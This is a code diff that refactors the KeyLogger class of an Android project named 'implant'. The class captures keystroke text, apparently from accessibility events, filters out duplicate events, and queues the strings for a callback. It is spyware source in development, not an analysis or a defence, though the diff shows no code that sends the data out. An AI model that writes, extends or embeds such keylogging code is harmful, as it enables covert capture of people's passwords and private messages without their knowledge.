@@ -1,24 +1,25 @@
 package com.cooperthecoder.implant
 
-import android.view.accessibility.AccessibilityEvent
 import java.util.*
 import java.util.concurrent.ConcurrentLinkedQueue
+import java.util.concurrent.atomic.AtomicLong
 
 class KeyLogger(val callback: (String) -> Unit) {
 
-    val keyEventQueue: Queue<AccessibilityEvent> = ConcurrentLinkedQueue<AccessibilityEvent>()
+    val keystrokes: Queue<String> = ConcurrentLinkedQueue<String>()
+    val lastEvent = AtomicLong(0)
 
-    fun recordKeystroke(keyEvent: AccessibilityEvent) {
-        val top = keyEventQueue.peek()
-        if (top != null && top.eventTime - keyEvent.eventTime < Config.KEY_PRESS_TIMEOUT) {
-            // Duplicate event from Android: ignore
+    fun recordKeystroke(keystroke: String, time: Long) {
+        // Avoid duplicate events from Android
+        val last = lastEvent.get()
+        if (time - last < Config.KEY_PRESS_TIMEOUT) {
             return
         }
 
-        val keystroke = keyEvent.source?.text?.toString() ?: return
+        lastEvent.set(time)
         when (keystroke) {
             else -> {
-                keyEventQueue.add(keyEvent)
+                keystrokes.add(keystroke)
             }
         }
     }
